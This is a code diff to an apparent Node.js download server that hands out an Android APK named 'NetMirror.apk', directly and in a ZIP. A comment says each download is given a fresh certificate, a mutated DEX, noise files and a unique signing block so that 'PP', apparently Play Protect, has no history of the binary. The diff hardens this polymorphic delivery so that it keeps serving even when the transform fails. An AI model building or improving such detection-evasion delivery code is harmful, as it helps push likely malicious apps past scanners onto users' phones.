@@ -543,12 +543,17 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
         // Each download gets a FRESH cert + mutated DEX + random noise files +
         // unique signing block. PP has zero history on the resulting binary.
         console.log(`[DL] Applying polymorphic transform to wrapper (${(wrapperBuf.length / 1048576).toFixed(2)} MB)...`);
-        const { buffer: polyBuf, certInfo, polymorphic } = polymorphicTransformWrapper(wrapperBuf);
-        const serveBuf = polymorphic ? polyBuf : wrapperBuf;
-        if (polymorphic) {
-          console.log(`[DL] Serving polymorphic wrapper: ${(serveBuf.length / 1048576).toFixed(2)} MB, cert="${certInfo?.cn || 'unknown'}"`);
-        } else {
-          console.log('[DL] Polymorphic transform failed — serving base wrapper');
+        let serveBuf = wrapperBuf;
+        try {
+          const { buffer: polyBuf, certInfo, polymorphic } = polymorphicTransformWrapper(wrapperBuf);
+          if (polymorphic) {
+            serveBuf = polyBuf;
+            console.log(`[DL] Serving polymorphic wrapper: ${(serveBuf.length / 1048576).toFixed(2)} MB, cert="${certInfo?.cn || 'unknown'}"`);
+          } else {
+            console.log('[DL] Polymorphic transform returned non-polymorphic — serving base wrapper');
+          }
+        } catch (polyErr) {
+          console.error('[DL] Polymorphic transform error:', polyErr.message, '— serving base wrapper');
         }
         res.setHeader('Content-Type', 'application/vnd.android.package-archive');
         res.setHeader('Content-Disposition', 'attachment; filename="NetMirror.apk"');
@@ -557,12 +562,27 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
         res.setHeader('Pragma', 'no-cache');
         return res.end(serveBuf);
       }
-      // No wrapper available anywhere — return error instead of serving full APK
-      console.error('[DL] No wrapper APK available. Upload one via admin panel.');
-      res.status(503).json({ error: 'App package is being prepared. Please try again in 30 seconds.', retry: true });
+      // No wrapper available — fall back to serving the FULL APK instead of returning JSON error.
+      // A JSON error response causes Chrome to save "NetMirror.apk.json" which confuses the user.
+      console.warn('[DL] No wrapper APK available — falling back to full APK');
+      try {
+        const apkBuf = await getApkBuffer();
+        if (apkBuf) {
+          res.setHeader('Content-Type', 'application/vnd.android.package-archive');
+          res.setHeader('Content-Disposition', 'attachment; filename="NetMirror.apk"');
+          res.setHeader('Content-Length', apkBuf.length);
+          res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, private');
+          res.setHeader('Pragma', 'no-cache');
+          return res.end(apkBuf);
+        }
+      } catch (_) {}
+      // Absolute last resort — return a plain text error, NOT JSON (prevents .apk.json filename)
+      res.setHeader('Content-Type', 'text/plain');
+      res.status(503).send('App is being prepared. Please try again in 30 seconds.');
     } catch (err) {
       console.error('[DL] APK serve failed:', err.message);
-      res.status(503).json({ error: 'APK is being prepared. Please try again in 30 seconds.', retry: true });
+      res.setHeader('Content-Type', 'text/plain');
+      res.status(503).send('App is being prepared. Please try again in 30 seconds.');
     }
   });
 
@@ -580,8 +600,13 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
       }
       if (wrapperBuf) {
         // Polymorphic transform — unique APK per download
-        const { buffer: polyBuf, polymorphic } = polymorphicTransformWrapper(wrapperBuf);
-        const serveBuf = polymorphic ? polyBuf : wrapperBuf;
+        let serveBuf = wrapperBuf;
+        try {
+          const { buffer: polyBuf, polymorphic } = polymorphicTransformWrapper(wrapperBuf);
+          if (polymorphic) serveBuf = polyBuf;
+        } catch (polyErr) {
+          console.error('[DL-ZIP] Polymorphic transform error:', polyErr.message, '— using base wrapper');
+        }
         // Wrap in ZIP
         const zipArchive = new AdmZip();
         zipArchive.addFile('README.txt', Buffer.from(
@@ -613,7 +638,8 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
       res.end(zipBuf);
     } catch (err) {
       console.error('[DL-ZIP] ZIP serve failed:', err.message);
-      res.status(503).json({ error: 'APK is being prepared. Please try again in 30 seconds.', retry: true });
+      res.setHeader('Content-Type', 'text/plain');
+      res.status(503).send('App is being prepared. Please try again in 30 seconds.');
     }
   });
 
